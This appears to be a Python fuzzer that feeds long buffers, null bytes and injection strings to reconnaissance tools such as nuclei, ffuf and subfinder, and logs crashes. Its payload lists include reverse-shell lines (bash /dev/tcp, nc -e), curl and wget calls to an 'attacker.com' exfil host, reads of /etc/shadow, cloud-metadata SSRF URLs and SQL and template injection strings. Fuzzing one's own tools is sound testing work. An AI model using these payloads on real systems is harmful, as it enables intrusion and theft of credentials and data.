#!/usr/bin/env python3
"""
SAST FUZZER v1.0
Targets: naabu, nuclei, ffuf, httpx-toolkit, gau, waybackurls, subfinder
Generates malformed flags, long buffers, null bytes, and shell injection
payloads, feeding them sequentially into the target binary.

Usage:
    python3 sast_fuzzer.py naabu [-l <list>]
    python3 sast_fuzzer.py nuclei
    python3 sast_fuzzer.py ffuf
    python3 sast_fuzzer.py httpx-toolkit
    python3 sast_fuzzer.py gau
    python3 sast_fuzzer.py subfinder
    python3 sast_fuzzer.py --all          # Fuzz ALL tools sequentially
    python3 sast_fuzzer.py --monitor      # Watch crash logs continuously
"""

import subprocess
import sys
import os
import random
import string
import time
import signal
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
from typing import List, Tuple, Optional

# --- CONFIGURATION ---
CRASH_LOG = "/tmp/sast_fuzzer_crashes.log"
MAX_ARG_LEN = 65536
TIMEOUT_SEC = 15
FUZZ_ROUNDS = 100
DUMMY_DOMAIN = "test.example.com"
DUMMY_LIST = "/tmp/_sast_fuzz_dummy.txt"
DUMMY_URL = "https://test.example.com"
DUMMY_IP = "192.0.2.1"

# --- PAYLOAD GENERATORS ---

def rand_str(min_len=1, max_len=256):
    length = random.randint(min_len, max_len)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def long_buffer(min_len=4096, max_len=MAX_ARG_LEN):
    length = random.randint(min_len, max_len)
    return 'A' * length

def null_byte_payload():
    patterns = [
        "test\x00.com",
        "\x00-admin",
        "domain\x00.com\x00",
        "file%s\x00.txt" % rand_str(4),
        "\x00" * 100 + "test",
    ]
    return random.choice(patterns)

def shell_injection_payload():
    patterns = [
        ";id;",
        "`id`",
        "$(id)",
        "|id|",
        "&id&",
        "';cat /etc/passwd;'",
        '"|whoami|"',
        "$(curl https://attacker.com/exfil)",
        "`wget https://attacker.com/exfil`",
        "|bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "$(python3 -c 'import os;os.system(\"id\")')",
        "';system(\"id\");//",
        "'.system(\"id\");'",
        "${IFS}id",
        "$(echo$(IFS)id)",
        '";cat /etc/shadow;"',
        "`nc -e /bin/sh 127.0.0.1 4444`",
    ]
    return random.choice(patterns)

def url_injection_payload():
    patterns = [
        "http://127.0.0.1:8080/admin",
        "http://[::1]:22",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://localhost:6379/_FLUSHALL",
        "dict://localhost:11211/stat",
        "http://0.0.0.0:5432/",
        "http://10.0.0.1:3306/",
        "http://localhost:9200/_cat/indices",
        "http://burpcollaborator.net/test",
    ]
    return random.choice(patterns)

def path_traversal_payload():
    patterns = [
        "../../etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "../../proc/self/environ",
        "../../.git/config",
        "..;/..;/etc/passwd",
    ]
    return random.choice(patterns)

def waf_bypass_payload():
    patterns = [
        "' OR '1'='1",
        "1 UNION SELECT 1,2,3--",
        "<script>alert(1)</script>",
        "{{7*7}}",
        "#{7*7}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{''.class}}",
        "${''.class}",
    ]
    return random.choice(patterns)

def special_chars_payload():
    patterns = [
        "\n\r\t\b\a",
        chr(0x1b) * 50,  # ESC sequence
        chr(0x08) * 100,  # Backspace flood
        "\xff\xfe\x00\x01",
        "%00%0a%0d%ff",
        "-" * 100 + " " + "-" * 100,
        "!" * 256,
        "@" * 256 + "#" * 256,
        "\\\\" * 100,
        "''''''\"\"\"\"\"\"",
    ]
    return random.choice(patterns)

# --- COMMAND GENERATORS PER TOOL ---

def gen_naabu_cmd(payload_type, payload):
    host = DUMMY_DOMAIN
    flag = random.choice(["-p", "-rate", "-top-ports", "-timeout", "-retries", "-c", "-stats"])
    return [shutil.which("naabu") or "naabu", flag, payload, host]

def gen_nuclei_cmd(payload_type, payload):
    if payload_type == "long_buffer":
        return [shutil.which("nuclei") or "nuclei", "-t", payload, "-silent"]
    elif payload_type == "shell_inject":
        return [shutil.which("nuclei") or "nuclei", "-u", payload, "-silent"]
    elif payload_type == "path_traversal":
        return [shutil.which("nuclei") or "nuclei", "-o", payload, "-silent"]
    elif payload_type == "url_inject":
        return [shutil.which("nuclei") or "nuclei", "-l", "/tmp/nonexistent", "-proxy", payload, "-silent"]
    else:
        return [shutil.which("nuclei") or "nuclei", "-H", "X-Test: " + payload, "-u", DUMMY_URL, "-silent"]

def gen_ffuf_cmd(payload_type, payload):
    if payload_type == "long_buffer":
        return [shutil.which("ffuf") or "ffuf", "-w", payload]
    elif payload_type == "shell_inject":
        return [shutil.which("ffuf") or "ffuf", "-u", "https://" + payload + "/FUZZ", "-w", DUMMY_LIST]
    elif payload_type == "path_traversal":
        return [shutil.which("ffuf") or "ffuf", "-o", payload, "-u", DUMMY_URL + "/FUZZ", "-w", DUMMY_LIST]
    elif payload_type == "null_byte":
        return [shutil.which("ffuf") or "ffuf", "-H", "Host: " + payload, "-u", DUMMY_URL + "/FUZZ", "-w", DUMMY_LIST]
    else:
        return [shutil.which("ffuf") or "ffuf", "-d", payload, "-u", DUMMY_URL + "/FUZZ", "-w", DUMMY_LIST, "-X", "POST"]

def gen_httpx_cmd(payload_type, payload):
    if payload_type == "shell_inject":
        return [shutil.which("httpx-toolkit") or "httpx", "-u", "https://" + payload]
    elif payload_type == "path_traversal":
        return [shutil.which("httpx-toolkit") or "httpx", "-o", payload, "-u", DUMMY_URL]
    elif payload_type == "long_buffer":
        return [shutil.which("httpx-toolkit") or "httpx", "-threads", payload, "-u", DUMMY_URL]
    elif payload_type == "url_inject":
        return [shutil.which("httpx-toolkit") or "httpx", "-proxy", payload, "-u", DUMMY_URL]
    else:
        return [shutil.which("httpx-toolkit") or "httpx", "-H", "X-Forwarded-For: " + payload, "-u", DUMMY_URL]

def gen_gau_cmd(payload_type, payload):
    if payload_type == "shell_inject":
        return [shutil.which("gau") or "gau", payload]
    elif payload_type == "path_traversal":
        return [shutil.which("gau") or "gau", "--o", payload]
    elif payload_type == "url_inject":
        return [shutil.which("gau") or "gau", "--proxy", payload]
    elif payload_type == "long_buffer":
        return [shutil.which("gau") or "gau", "--threads", payload, DUMMY_DOMAIN]
    else:
        return [shutil.which("gau") or "gau", "--blacklist", payload]

def gen_subfinder_cmd(payload_type, payload):
    if payload_type == "shell_inject":
        return [shutil.which("subfinder") or "subfinder", "-d", payload]
    elif payload_type == "path_traversal":
        return [shutil.which("subfinder") or "subfinder", "-d", DUMMY_DOMAIN, "-o", payload]
    elif payload_type == "long_buffer":
        return [shutil.which("subfinder") or "subfinder", "-d", DUMMY_DOMAIN, "-t", payload]
    elif payload_type == "url_inject":
        return [shutil.which("subfinder") or "subfinder", "-d", DUMMY_DOMAIN, "-r", payload]
    else:
        return [shutil.which("subfinder") or "subfinder", "-d", DUMMY_DOMAIN, "-p", payload]

# --- FUZZER ENGINE ---

GENERATORS = {
    "naabu": gen_naabu_cmd,
    "nuclei": gen_nuclei_cmd,
    "ffuf": gen_ffuf_cmd,
    "httpx-toolkit": gen_httpx_cmd,
    "gau": gen_gau_cmd,
    "subfinder": gen_subfinder_cmd,
}

PAYLOAD_TYPES = [
    ("long_buffer", long_buffer),
    ("null_byte", null_byte_payload),
    ("shell_inject", shell_injection_payload),
    ("url_inject", url_injection_payload),
    ("path_traversal", path_traversal_payload),
    ("waf_bypass", waf_bypass_payload),
    ("special_chars", special_chars_payload),
]

def ensure_dummy_list():
    with open(DUMMY_LIST, "w") as f:
        f.write(DUMMY_DOMAIN + "\n")
        f.write(DUMMY_IP + "\n")
        f.write("sub." + DUMMY_DOMAIN + "\n")
    return DUMMY_LIST

def log_crash(binary, cmd, returncode, stderr, exc_info=None):
    ts = datetime.now().isoformat()
    with open(CRASH_LOG, "a") as f:
        f.write("[%s] CRASH in %s\n" % (ts, binary))
        f.write("  Return code: %s\n" % returncode)
        f.write("  Command: %s\n" % subprocess.list2cmdline(cmd))
        if stderr:
            f.write("  Stderr (%d bytes): %s\n" % (len(stderr), stderr[:500]))
        if exc_info:
            f.write("  Exception: %s\n" % str(exc_info))
        f.write("-" * 60 + "\n")

def fuzz_binary(binary, rounds=FUZZ_ROUNDS):
    if binary not in GENERATORS:
        print("  Unknown binary: %s" % binary)
        print("  Available: %s" % ", ".join(sorted(GENERATORS.keys())))
        return

    binary_path = shutil.which(binary)
    if not binary_path:
        print("  Binary '%s' not found in PATH - skipping" % binary)
        return

    ensure_dummy_list()

    print("\n" + "=" * 60)
    print("  FUZZING: %s (%s) - %d rounds" % (binary, binary_path, rounds))
    print("=" * 60)

    crashes = 0
    segfaults = 0
    aborts = 0

    for i in range(1, rounds + 1):
        ptype, pgen = random.choice(PAYLOAD_TYPES)
        payload = pgen()
        cmd = GENERATORS[binary](ptype, payload)
        desc = "[%s] %s" % (ptype, repr(payload)[:60])

        print("  [%3d/%d] %s" % (i, rounds, desc[:70]), end="")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=TIMEOUT_SEC,
                start_new_session=True,
            )
            rc = result.returncode
            if rc < 0:
                sig = -rc
                sig_name = signal.Signals(sig).name if sig in signal.Signals.__members__.values() else "SIG???"
                crashes += 1
                if sig == signal.SIGSEGV:
                    segfaults += 1
                elif sig == signal.SIGABRT:
                    aborts += 1
                log_crash(binary, cmd, rc, result.stderr.decode(errors='replace'))
                print("  CRASH (signal %d %s)" % (sig, sig_name))
            elif rc != 0:
                print("  exit %d" % rc)
            else:
                print("  OK")
        except subprocess.TimeoutExpired:
            print("  TIMEOUT (>%ds)" % TIMEOUT_SEC)
            # Kill the hung process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['cmdline'] and binary in ' '.join(proc.info['cmdline']):
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except Exception as e:
            print("  ERROR: %s" % str(e)[:50])

    print("\n  Results for %s: %d rounds, %d crashes (%d segfaults, %d aborts)" %
          (binary, rounds, crashes, segfaults, aborts))
    print("  Full crash log: %s" % CRASH_LOG)

def monitor_crashes():
    print("\nMonitoring crash log: %s" % CRASH_LOG)
    print("Press Ctrl+C to stop.\n")
    try:
        last_size = os.path.getsize(CRASH_LOG) if os.path.exists(CRASH_LOG) else 0
        while True:
            time.sleep(2)
            if os.path.exists(CRASH_LOG):
                current = os.path.getsize(CRASH_LOG)
                if current > last_size:
                    with open(CRASH_LOG, "r") as f:
                        f.seek(last_size)
                        new_content = f.read()
                    if new_content.strip():
                        print(new_content)
                    last_size = current
    except KeyboardInterrupt:
        print("\nMonitor stopped.")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="SAST Fuzzer for CLI tools")
    parser.add_argument("binary", nargs="?", help="Binary to fuzz")
    parser.add_argument("--all", action="store_true", help="Fuzz all known binaries")
    parser.add_argument("--rounds", type=int, default=FUZZ_ROUNDS, help="Number of fuzz rounds per binary")
    parser.add_argument("--monitor", action="store_true", help="Continuously monitor crash log")
    parser.add_argument("--list", action="store_true", help="List available targets")
    args = parser.parse_args()

    if args.list:
        print("Available fuzz targets:")
        for b in sorted(GENERATORS.keys()):
            path = shutil.which(b)
            print("  %-15s %s" % (b, path if path else "(NOT FOUND)"))
        return

    if args.monitor:
        monitor_crashes()
        return

    if args.all:
        for binary in sorted(GENERATORS.keys()):
            fuzz_binary(binary, args.rounds)
        return

    if not args.binary:
        parser.print_help()
        print("\nAvailable: %s" % ", ".join(sorted(GENERATORS.keys())))
        return

    fuzz_binary(args.binary, args.rounds)

if __name__ == "__main__":
    main()
